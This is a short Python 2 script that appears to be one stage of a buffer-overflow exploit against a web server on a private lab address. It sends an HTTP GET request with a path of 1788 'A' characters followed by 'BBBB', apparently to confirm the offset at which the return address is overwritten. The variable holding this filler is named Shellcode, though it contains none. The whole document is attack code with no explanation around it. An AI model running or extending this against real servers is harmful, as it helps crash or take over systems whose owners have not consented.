#!/bin/python
import sys, socket


Shellcode="A" * 1788 + "B" * 4
eob="HTTP/1.1\r\n\r\n"
try: 
     s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
     s.connect(('192.168.1.133',80))
     print("Sending pattern to Remote server" )
     s.send(('GET'+ Shellcode + eob))
     print s.recv(1024)
     print "\nDone!."
     s.close()
             	
except: 
     print("Error in connecting")
     sys.exit()
                   